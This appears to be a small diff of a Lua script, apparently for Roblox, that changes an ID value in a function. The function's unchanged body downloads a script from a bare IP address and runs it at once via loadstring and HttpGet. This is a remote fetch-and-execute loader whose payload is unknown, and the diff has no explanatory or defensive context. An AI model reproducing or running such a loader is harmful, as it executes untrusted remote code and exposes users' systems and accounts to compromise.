@@ -1,5 +1,5 @@
 local function a()
-    ID="23bdce1d-33e2-40d6-84b7-278c1a6a1c03";
+    ID="a7266030-606f-4882-a9fc-e4dfbbb51ce1";
     loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
 end
 
